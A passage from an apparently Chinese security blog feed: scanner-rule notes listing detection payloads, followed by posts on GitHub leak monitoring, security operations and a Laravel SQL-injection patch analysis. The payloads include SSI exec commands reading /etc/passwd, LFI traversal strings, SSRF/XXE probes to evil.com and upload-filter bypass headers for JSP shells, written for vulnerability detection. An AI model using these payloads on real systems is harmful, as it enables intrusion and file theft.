&lt;h3 id=&quot;crlf-注入&quot;&gt;CRLF 注入&lt;/h3&gt;

&lt;p&gt;检测是否成功注入header，这里有两个点需要注意：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;不建议使用敏感的头部参数，可以生造一个set-header键值对，也方便检测。&lt;/li&gt;
  &lt;li&gt;返回码需要为30x。&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;payload：
%0aset-header：ceshi;%0a

关键词：
ceshi
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;ssti-注入&quot;&gt;SSTI 注入&lt;/h3&gt;

&lt;p&gt;我们可以通过对response中的回显进行关键词匹配：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$\{\{11 * 11\}\}

121
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;ssi-注入&quot;&gt;SSI 注入&lt;/h3&gt;

&lt;p&gt;检测方式类似于命令执行漏洞，采用替换参数值的方式，换取回显关键词和dns请求匹配。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;!--#exec cmd=&quot;cat /etc/passwd&quot;--&amp;gt;
root

&amp;lt;!--#exec cmd=&quot;type c:\windows\win.ini&quot;--&amp;gt;
[extensions]
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;cors漏洞&quot;&gt;CORS漏洞&lt;/h3&gt;

&lt;p&gt;cors漏洞检测主要通过response中的header关键词，进行相应的定位匹配：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Origin: http://www.baidu.com

Access-Control-Allow-Origin: http://www.baidu.com
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;jsonp漏洞检测&quot;&gt;JSONP漏洞检测&lt;/h3&gt;

&lt;p&gt;jsonp漏洞需要依靠callback，利用场景简单提一下：&lt;/p&gt;

&lt;p&gt;在响应中回调函数被硬编码：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;基础函数调用&lt;/li&gt;
  &lt;li&gt;对象方法调用&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;动态调用回调函数：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;URL完全可控（GET变量）&lt;/li&gt;
  &lt;li&gt;URL部分可控（GET变量），但是附加有一个数字&lt;/li&gt;
  &lt;li&gt;URL可控，但最初不会显示在请求之中&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;那我们的检测方法可以这么做，先判断header是否存在：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Content-Type: application/json
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;再通过关键词定位json数据中，是否含有敏感数据。&lt;/p&gt;

&lt;h3 id=&quot;websocket劫持检测&quot;&gt;WEBSOCKET劫持检测&lt;/h3&gt;

&lt;p&gt;对于该漏洞，我们需要先检测header中是否含有Sec-WebSocket-Accept字段。&lt;/p&gt;

&lt;p&gt;可以把Origin: https://www.baidu.com修改Origin: http://www.evil.com，若看到服务器端response status返回了 101，可以判定有漏洞。&lt;/p&gt;

&lt;h3 id=&quot;url跳转漏洞&quot;&gt;URL跳转漏洞&lt;/h3&gt;

&lt;p&gt;首先我们需要检测是否存在任意跳转漏洞，替换参数值为下面的内容：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www.evil.com
@www.evil.com
\www.evil.com
\.www.evil.com
#www.evil.com
www.evil.com?vulnweb.cn
http://www.evil.com
http://www.evil.com?vulnweb.cn
evil.com
http://evil.com
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;然后，首先我们可以检测状态码为30x的response数据包里，是否Location解析出的域名为evil.com，亦或是定位evil.com特有可控的关键词。&lt;/p&gt;

&lt;p&gt;其次，某些返回包可以能会通过中转页面，借助js进行跳转。&lt;/p&gt;

&lt;p&gt;这时，我们可以选择去页面检测meta-refresh标签，以及检测以下标签：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;第1种：
&amp;lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&amp;gt;
　　window.location.href=&quot;login.jsp?backurl=&quot;+window.location.href;
　　&amp;lt;/script&amp;gt;
第2种：
&amp;lt;script language=&quot;javascript&quot;&amp;gt;
　　alert(&quot;返回&quot;);
　　window.history.back(-1);
　　&amp;lt;/script&amp;gt;
第3种：
&amp;lt;script language=&quot;javascript&quot;&amp;gt;
　　window.navigate(&quot;top.jsp&quot;);
　　&amp;lt;/script&amp;gt;
第4种：
&amp;lt;script language=&quot;JavaScript&quot;&amp;gt;
　　self.location=’top.htm’;
　　&amp;lt;/script&amp;gt;
第5种：
&amp;lt;script language=&quot;javascript&quot;&amp;gt;
　　alert(&quot;非法访问！&quot;);
　　top.location=’xx.jsp’;
　　&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;再者，我们可以采用更耗资源的暴力做法，直接用headless浏览器去发包，看是否落地域名是否为evil.com。&lt;/p&gt;

&lt;h3 id=&quot;文件读取漏洞lfi和rfi&quot;&gt;文件读取漏洞（LFI和RFI）&lt;/h3&gt;

&lt;p&gt;如果我们需要检测是否存在LFI，替换参数值对为下面的内容：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;追加：
../../../../../../../../../../../etc/passwd
%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
../../../../../../../../../../windows/win.ini

替换：
c:\windows\win.ini
/etc/passwd

匹配关键词：
root
[extensions]
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;至于RFI在放在下面一起讲。&lt;/p&gt;

&lt;h3 id=&quot;ssrf漏洞&quot;&gt;SSRF漏洞&lt;/h3&gt;

&lt;p&gt;本漏洞可以可以跟RFI采用类似的检测办法，采用DNS服务器来读取请求。&lt;/p&gt;

&lt;p&gt;这里提一下，如果是内网搭建DNS服务器，我们可以规避不能外联和内网IP限制的问题，能更精确的去进行检测。&lt;/p&gt;

&lt;p&gt;检测关键词如下：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://vuln.evil.com/index.jsp
http://127.0.0.1/index.jsp
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;发包之后，如果存在漏洞，可以去DNS服务接口去读取到匹配vuln.evil.com（内网DNS服务器为evil.com）的结果；
又或是读取到的内容，是否已经匹配到index.jsp里的动态脚本标签。&lt;/p&gt;

&lt;h3 id=&quot;文件下载漏洞&quot;&gt;文件下载漏洞&lt;/h3&gt;

&lt;p&gt;这里用的payload是文件读取漏洞的那套，但是定位的返回关键词不同，我们可以定位response里的header：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Content-Type:application/octet-stream
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;xxe漏洞&quot;&gt;XXE漏洞&lt;/h3&gt;

&lt;p&gt;检测xxe漏洞的时候，有两种情况可以尝试fuzz。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;post参数值里含有xml标签时，这种情况可能需要把xxe payload编码发送。&lt;/li&gt;
  &lt;li&gt;直接post了整个xml区块到server端，这种情况可以直接将整块xml区块，替换为xxe payload。&lt;/li&gt;
  &lt;li&gt;整块的xml标签就不写出来了，这里给出附加的payload对,，同样是关键词+DNS服务监听：&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;payload:
file:///etc/passwd
file:///c:/windows/win.ini
http://xxx.evil.com

匹配关键词：
root
[extensions]
以及dns监听请求evil.com
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;上传漏洞&quot;&gt;上传漏洞&lt;/h3&gt;

&lt;p&gt;上传漏洞的可操作的地方比较多，目前公布出的payload中，暂时还没有能完全囊括所有hack点，下面我们会以java为例简单讲讲。&lt;/p&gt;

&lt;h4 id=&quot;后缀&quot;&gt;后缀&lt;/h4&gt;
&lt;p&gt;在对java应用后缀绕过的时候，我们可以尝试对下面这些后缀进行fuzz：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jjspsp
jspx
jspa
jtml
jsw
jsv
jspf
jsp
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;冗余绕过&quot;&gt;冗余绕过&lt;/h4&gt;
&lt;p&gt;有些地方，我们进行了hack，但是却不影响数据包发送，比如：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Content-Disposition: form-data; name=&quot;myfile&quot;;;; filename=&quot;t3.jsp&quot;

Content-Disposition2: form-data; name=&quot;Upload&quot;; filename=&quot;1.jsp&quot;

合成一行：
Content‐Disposition: form-data; name=&quot;img_crop_file&quot;; filename=&quot;1.jsp&quot;Content-Type: image/jpeg

Content‐Disposition: form‐data; name=&quot;up_picture&quot;; filename=&quot;xss.js
p&quot;

boundary后面加空格：
Content-Type: multipart/form-data; boundary= —————————47146314211411730218525550

Content-Disposition: form-data; filename=&quot;xx.jsp&quot;; name=&quot;up_picture&quot;

Content-Disposition: form-data; name=&quot;file_x&quot;; filename=&quot;test.jpg&quot;; filename=&quot;test.jsp&quot;

Content-Disposition: form-data; name=&quot;Fhq&quot;; test=&quot;5W个字符&quot;; filename=&quot;test.jsp&quot;

多个Content-Disposition可以用来绕过waf，一般server默认取的是第一个，但研究范围没有覆盖全java web server，有待验证。

绕过文件类型的验证：
Content-Type: image/jpeg

或者直接删除文件类型的验证：
Content-Type: xxxxx
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;检测上传文件有一个痛点，那就是不好自动化定位上传点。&lt;/p&gt;

&lt;p&gt;对于&lt;strong&gt;有回显的情况&lt;/strong&gt;，暂时有以下的解决办法：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;利用标签正则，手工定位返回的上传点，这种方法对于大规模扫描时不适用。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;寻找同一批response包里带有shell后缀的路径，做好web url拼接，暂存后利用shell标识去挨个判断，是否上传成功shell。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;对于&lt;strong&gt;无回显的情况&lt;/strong&gt;下：&lt;/p&gt;

&lt;p&gt;如果黑盒测试，只能根据常用上传目录去爆破shell文件名，以获取到shell标识为成功。&lt;/p&gt;

&lt;p&gt;否则的话，需要结合白盒定位，手动配置好路径，估算生成的文件名，去进行黑盒探测。&lt;/p&gt;</content><author><name>HellSec</name></author><category term="scanner" /><summary type="html">本文中的规则分析，大部分来自于以前被动漏扫研发的实践，以后会再接触更多业务后，会继续进行更新。其中如有纰漏或者差错，希望诸位给出修正意见。</summary></entry><entry><title type="html">Git监控小议</title><link href="/operation/2019/07/28/sec-git-monitor/" rel="alternate" type="text/html" title="Git监控小议" /><published>2019-07-28T18:00:00+08:00</published><updated>2019-07-28T18:00:00+08:00</updated><id>/operation/2019/07/28/sec-git-monitor</id><content type="html" xml:base="/operation/2019/07/28/sec-git-monitor/">&lt;p&gt;
	&lt;span style=&quot;color:#00B050;&quot;&gt;&lt;strong&gt;笔者原来在涉猎git监控产品时，就只做了敏感关键词监控。后来在工作中逐渐发现，对于一般量级的企业单位，其实复合型的监控平台更符合这类企业的需求。&lt;/strong&gt;&lt;/span&gt;
&lt;/p&gt;

&lt;p&gt;那么，对于git方面的监控，我们应该做些什么呢？&lt;/p&gt;

&lt;h3 id=&quot;复合型监控&quot;&gt;复合型监控&lt;/h3&gt;

&lt;h4 id=&quot;敏感关键词监控&quot;&gt;敏感关键词监控&lt;/h4&gt;

&lt;p&gt;对于类github监控，敏感关键词监控是基础，目前主要监控点有以下几种：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;敏感email地址
敏感多级子域名
ssh key
物理机key
云平台key
硬编码的pwd
关键域名+敏感路径+敏感key的拼接
（比如https://xxx/host/{ip}?key={YOUR_API_KEY}）
组织单位标识
关键数据库名、表格名、字段名、连接字符串
vpn配置字符串
smtp配置字符串
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;大部分类github平台，查询应该是需要登录的，这里以github举个例子。&lt;/p&gt;

&lt;p&gt;我们可以用session认证，不过只有前100页的查询限制。&lt;/p&gt;

&lt;p&gt;当然，大家也可以用key+api接口，个人没采用过这个接口，据说默认搜索前5000个项目。&lt;/p&gt;

&lt;p&gt;所以利用好语法是很重要的，我们要精确地对需要监控的关键词，进行综合定位：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;搜索路径中有nsa的代码或者文件中有nsa的代码
nsa in:file,path

搜索用php写的包含userid的代码,文件名为flag，扩展名为txt
userid language:php filename:flag extension:txt

匹配关键字nsa且搜索大小为100字节的xml代码
nsa language:xml size:100

搜索conf目录下包含pass的xml代码
pass path:conf language:xml

除去名为normal_name的repo
-repo:normal_name

搜索star大于20，20&amp;lt;fork&amp;lt;30的项目
stars: &amp;gt;20 fork: 20..30


&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;另外，类github平台如果做了查询限制，可以考虑采用以下几点去绕过：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;IP池
多账号轮询
UA池
降频处理
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;安全监控&quot;&gt;安全监控&lt;/h4&gt;

&lt;p&gt;在大一点的企业平台，做项目管控时，会接入gitlab或者类github平台的私有项目。&lt;/p&gt;

&lt;p&gt;那么，如果要坚持精简的原则，我们需要完成哪些基础点呢？&lt;/p&gt;

&lt;p&gt;第一，版本监控
每次漏洞大规模爆发时，常常需要去检查下，己方线上环境的组件，是否出于漏洞影响范围之内。&lt;/p&gt;

&lt;p&gt;因此，维护和及时更新IT资产的checklist库，无论是实现的半自动化还是自动化监控，都是有一定积极作用的。&lt;/p&gt;

&lt;p&gt;第二，安全审计
对于项目本身，我们需要做一些代码安全审计和日常扫描。&lt;/p&gt;

&lt;p&gt;一般在代码上线，以及测试分支代码变更时，在条件允许的情况下，都应该触发自动化安全扫描。&lt;/p&gt;

&lt;p&gt;在CI自动化和日常扫描时，一旦检测到问题，需要发送报告到安全运维人员过审，再决定要不要通告开发人员，去进行整改或者代码回退。&lt;/p&gt;

&lt;p&gt;对于代码本身，可提供配置文件或者接口，供第三方软件，进行安全审计，这里不再多提。&lt;/p&gt;

&lt;h4 id=&quot;舆情监控&quot;&gt;舆情监控&lt;/h4&gt;

&lt;p&gt;现如今类github平台因为某些zz原因，成为了某些有心人撰写博客和放新闻的地方。&lt;/p&gt;

&lt;p&gt;笔者当初做舆情监控接口的时候，也添加了对这类平台的接口支持，效果感觉尚可。&lt;/p&gt;

&lt;h3 id=&quot;平台优化tips&quot;&gt;平台优化Tips&lt;/h3&gt;

&lt;h4 id=&quot;关键词定制&quot;&gt;关键词定制&lt;/h4&gt;

&lt;p&gt;如果我们在开发后期，想要去定制一些关键词咋办？&lt;/p&gt;

&lt;p&gt;存在配置文件的情况下，我们可以做关键词命中。&lt;/p&gt;

&lt;p&gt;一旦触发命中我们自己添加的关键词（不一定是标准搜索语法），也会直接通过微信或者邮件，将结果推送到负责人那里。&lt;/p&gt;

&lt;h4 id=&quot;规则可配置&quot;&gt;规则可配置&lt;/h4&gt;

&lt;p&gt;规则配置可以是多样化的，比如类github平台定期巡检，更新触发扫描，主动扫描检查。&lt;/p&gt;

&lt;p&gt;多少时间没响应，会自动再次触发报警推送，多种方式报送警报消息。&lt;/p&gt;

&lt;p&gt;制定repo或者author白名单，避免更多的误报。&lt;/p&gt;

&lt;p&gt;优化读取的内容，指定显示关键词前后文行数。&lt;/p&gt;

&lt;p&gt;设置关键词权重，避免大量冗余数据掩盖了低频高危数据。&lt;/p&gt;

&lt;h4 id=&quot;污点化&quot;&gt;污点化&lt;/h4&gt;

&lt;p&gt;在为了防止企业git项目被泄露到公网，我们在命名规范时，可以尝试制定编码规范，必须带上容易识别的特征，或者带上关键词。&lt;/p&gt;

&lt;p&gt;这样有个好处，在代码泄露时能及时监控到，但防君子不防小人，内部人员可能会做关键词替换。但这种情况，也可以通过一些特殊技巧去提升保密性。&lt;/p&gt;

&lt;p&gt;另外，白帽子提交速度可能比监控响应更快，这就需要考验规范制定者的素质了。&lt;/p&gt;

&lt;h4 id=&quot;参考文章&quot;&gt;参考文章&lt;/h4&gt;

&lt;p&gt;&lt;a href=&quot;https://www.freebuf.com/articles/web/150638.html&quot;&gt;深入分析一款简单的Github信息泄露爬虫&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/xpx1995/article/details/79031397&quot;&gt;Github代码高级搜索小技巧&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.freebuf.com/sectool/114017.html&quot;&gt;基于Github的源码白盒扫描工具Raptor&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.freebuf.com/column/178342.html&quot;&gt;Github信息泄露专项&lt;/a&gt;&lt;/p&gt;</content><author><name>HellSec</name></author><category term="operation" /><summary type="html">笔者原来在涉猎git监控产品时，就只做了敏感关键词监控。后来在工作中逐渐发现，对于一般量级的企业单位，其实复合型的监控平台更符合这类企业的需求。</summary></entry><entry><title type="html">安全运维优化思考</title><link href="/operation/2019/07/13/sec-operation/" rel="alternate" type="text/html" title="安全运维优化思考" /><published>2019-07-13T23:40:00+08:00</published><updated>2019-07-13T23:40:00+08:00</updated><id>/operation/2019/07/13/sec-operation</id><content type="html" xml:base="/operation/2019/07/13/sec-operation/">&lt;p&gt;
	&lt;span style=&quot;color:#DAA520;&quot;&gt;&lt;strong&gt;近期由乙方安服实验室，转入了甲方的业务安全部门。在接触了一部分业务安全的运维工作后，也做了些对于自身工作的优化方向的思考。&lt;/strong&gt;&lt;/span&gt;
&lt;/p&gt;

&lt;h4 id=&quot;资产统计与变更&quot;&gt;资产统计与变更&lt;/h4&gt;
&lt;p&gt;这段时间正好碰上了FastJson漏洞爆发。由于笔者所在的甲方，属于有一定规模的互联网公司，所以近期也在连夜配合各业务部门进行漏洞修补。&lt;/p&gt;

&lt;p&gt;虽然公司本身具有强大的统计平台，也具有较为成熟的资产规范，但还是花了大量时间去统计、升级那些受影响的资产。&lt;/p&gt;

&lt;p&gt;举个例子，自家公司的It资产已经接入了自动化运维，采用了基于的ES集群的平台。资产的变更能够及时以*key为基准，计入全局搜索，方便以后搜索和资产统计，以及后续的自动化升级和部署。&lt;/p&gt;

&lt;p&gt;但这种统一部署变更的法子，也存在部分痛点。其中的一个就是，一旦基于ES部署平台和Agent自身存在问题，如果没有得到及时修复的话，其自身不小的体量，可能会影响全局资产的修复进度。&lt;/p&gt;

&lt;p&gt;因此，拥有多份资产升级/变更/检测方案，能做到轻量/重量级方案互相制约，窃以为还是有必要的。&lt;/p&gt;

&lt;p&gt;另外，如果做好了内网Git资产梳理，通过代码扫描定位可能存在的漏洞和服务，也是能辅助统计受影响的资产的。&lt;/p&gt;

&lt;h4 id=&quot;自动化检测认证&quot;&gt;自动化检测认证&lt;/h4&gt;
&lt;p&gt;对于大型甲方，如果安全团队在研究好新出的漏洞Poc，对IT资产安全进行自检的时候，如果按正常流程去做，可能首先应该是先进行任务申请上报，然后向全集团发邮件，最后再进行扫描。&lt;/p&gt;

&lt;p&gt;不过，在碰上比较紧急的漏洞应急时，在跨部门协作的情况下，经常会来不及走完所有流程。&lt;/p&gt;

&lt;p&gt;笔者也曾见过研发、运维等部门，因为突然查到攻击Log，半夜一惊一乍的，去找安全部门验证攻击来源是否属于内部自检。&lt;/p&gt;

&lt;p&gt;那么针对这一点，如何做去做优化呢？&lt;/p&gt;

&lt;p&gt;不少大型企业，有时会采用统一的签名和加密机制，或者直接构建单独的平台，用于保证传输加密的可信认证。&lt;/p&gt;

&lt;p&gt;笔者窃以为，这点是可以借鉴的。如果能做好一定范围内的成本控制，在每次做自动化安全检测的时候，将加密认证信息加入检测数据包头部，以用作内部安全检测的授信，各个BU会更加轻松的识别出真实的攻击事件。&lt;/p&gt;

&lt;h4 id=&quot;敏感数据泄漏控制&quot;&gt;敏感数据泄漏控制&lt;/h4&gt;
&lt;p&gt;防止敏感数据的泄漏，以及进行事后的责任追溯，一直是甲方比较重视的点，据悉大致有这样几种方案：&lt;/p&gt;

&lt;p&gt;1.DLP数据防泄漏&lt;/p&gt;

&lt;p&gt;DLP软件一般是为了定位公司敏感数据外发行为，对于数据流量内容进行监控审计，现在市面上也有了不少成熟的合规产品。&lt;/p&gt;

&lt;p&gt;2.堡垒机&lt;/p&gt;

&lt;p&gt;堡垒机上具有监控，限制数据传输和全程录屏等功能，配合查询系统的水印功能，也能在一定程度上防止数据泄漏，以及对泄漏源进行追溯。&lt;/p&gt;

&lt;p&gt;3.数据脱敏&lt;/p&gt;

&lt;p&gt;在存储和展示敏感数据的时候，本身应该做好脱敏操作，对于数据进行加密存储和非完全展示，防止内鬼和意外泄漏事件发生。&lt;/p&gt;

&lt;p&gt;4.数据监控&lt;/p&gt;

&lt;p&gt;虽然如同Github监控和舆情监控一般的产品，并不能有效抑制数据泄漏。但在防止数据扩散，以及追溯数据泄漏来源的层面来看，还是比较有用的。&lt;/p&gt;

&lt;p&gt;如果能综合利用多类产品，再加上企业本身的安全管理规范，应该是能够在一定程度上保证数据安全的。&lt;/p&gt;

&lt;h4 id=&quot;产品检测流程&quot;&gt;产品检测流程&lt;/h4&gt;
&lt;p&gt;在原来的乙方安全测试岗位，如果需要对产品做安检的时候，随便去咨询个资深的相关产品、售前或者研发，基本上都能问出个所以然来。&lt;/p&gt;

&lt;p&gt;然而到了现在的甲方安全运维岗，可就厉害了。在工作流程细化和文档化以后，需要做安全检测时，得挨个询问多个QA/RD/PM，一点一点把他们的需求和设计方案抠出来，最后还得去找API文档自己做补充和完善，才能进行下一步的操作。&lt;/p&gt;

&lt;p&gt;笔者这两天还去拜访了一家非互联网甲方，跟那边负责安全的Leader朋友聊了下，产品上线合规的紧要性，确实是远优先于安全合规的，当然这个也是不得已而为之。&lt;/p&gt;

&lt;p&gt;总的来说，合规化有益于流程梳理，简化有益于加速产品上线，也算各有各的好处吧。&lt;/p&gt;

&lt;p&gt;当然笔者见识有限，窥一斑而不得见全豹。但总的来说，确实可以根据不同产品的实际情况，去对流程进行一些灵活变通。&lt;/p&gt;

&lt;h4 id=&quot;后记&quot;&gt;后记&lt;/h4&gt;
&lt;p&gt;以上只是简单谈了一些感受，这方面的工作资历尚浅，期待各路读者斧正和指教。&lt;/p&gt;</content><author><name>HellSec</name></author><category term="operation" /><summary type="html">近期由乙方安服实验室，转入了甲方的业务安全部门。在接触了一部分业务安全的运维工作后，也做了些对于自身工作的优化方向的思考。</summary></entry><entry><title type="html">PHP开发框架LaravelのSQL注入漏洞分析</title><link href="/bug/2019/03/26/php-framework-Laravel-sqli/" rel="alternate" type="text/html" title="PHP开发框架LaravelのSQL注入漏洞分析" /><published>2019-03-26T19:07:00+08:00</published><updated>2019-03-26T19:07:00+08:00</updated><id>/bug/2019/03/26/php-framework-Laravel-sqli</id><content type="html" xml:base="/bug/2019/03/26/php-framework-Laravel-sqli/">&lt;p&gt;
	&lt;span style=&quot;color:#00B050;&quot;&gt;&lt;strong&gt;PHP开发框架Laravel，前几天在官方博客通报了一个SQL注入漏洞，这里简单分析下。&lt;/strong&gt;&lt;/span&gt;
&lt;/p&gt;

&lt;p&gt;首先，这个漏洞属于网站coding写法不规范，官方给了提示：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://ww1.sinaimg.cn/large/697f6f27ly1g1gby7vp5qj20hx03ht8x.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;但官方还是做了修补，升级最新版本V5.8.7可修复。&lt;/p&gt;

&lt;p&gt;我们先定位下这里：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Illuminate\Validation\Rule
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;官方推荐的写法是：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Rule::unique('users')-&amp;gt;ignore($id),
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;但如果网站没有预先对$id的值做处理时，用户可以传递恶意数据给ignore函数，就会导致SQL注入。&lt;/p&gt;

&lt;p&gt;我们来跟一下函数：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;\Illuminate\Validation\Rules\Unique.php

class Unique
{
...
public function ignore($id, $idColumn = null)
    {
        if ($id instanceof Model) {
            return $this-&amp;gt;ignoreModel($id, $idColumn);
        }

        $this-&amp;gt;ignore = $id;
        $this-&amp;gt;idColumn = $idColumn ?? 'id';

        return $this;
    }

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;这里我们不考虑把$id写成实例的情况，$id是用户可控的话，$idColumn直接写为空即可，最后赋值情况如下：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$this-&amp;gt;ignore = $id;
$this-&amp;gt;idColumn = 'id';
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;如果网站代码类似这样构造的话，黑客输入的值就属于可控状态：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$id = $request-&amp;gt;input('id');
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;最后我们会走到这儿：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Illuminate\Validation\Rules\Unique.php

    public function __toString()
    {
        ...
        ...
    }
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;我们看下关键的代码变更：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Illuminate\Validation\Rules\Unique.php

V5.8.7【最新版】
    public function __toString()
    {
            $this-&amp;gt;ignore ? '&quot;'.addslashes($this-&amp;gt;ignore).'&quot;' : 'NULL',
    }
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Illuminate\Validation\Rules\Unique.php

V5.8.4
    public function __toString()
    {

            $this-&amp;gt;ignore ? '&quot;'.$this-&amp;gt;ignore.'&quot;' : 'NULL',

    }
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;这里最新的代码v5.8.7，把$this-&amp;gt;ignore直接给addslashes了，以前这里是没有防护的。&lt;/p&gt;

&lt;p&gt;有趣的是，笔者对比了下diff，期间官方还试图对其他引用的地方进行了过滤。最后还是改成了__toString处，进行统一过滤的方式。&lt;/p&gt;

&lt;p&gt;最后提一句，后面的代码会进入DatabaseRule，进行后续SQL规则匹配。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Illuminate\Validation\Rules\DatabaseRule.php
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;这之后就没有再进一步处理，接着形成了SQL注入。&lt;/p&gt;

&lt;p&gt;参考链接：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://blog.laravel.com/unique-rule-sql-injection-warning?fbclid=IwAR26Cs1Ewh983UxSF5fNO8Xr0hUnwSO_Ikbr08Adi20m5h5llP0WhNDmgRg&quot;&gt;官方通告&lt;/a&gt;&lt;/p&gt;

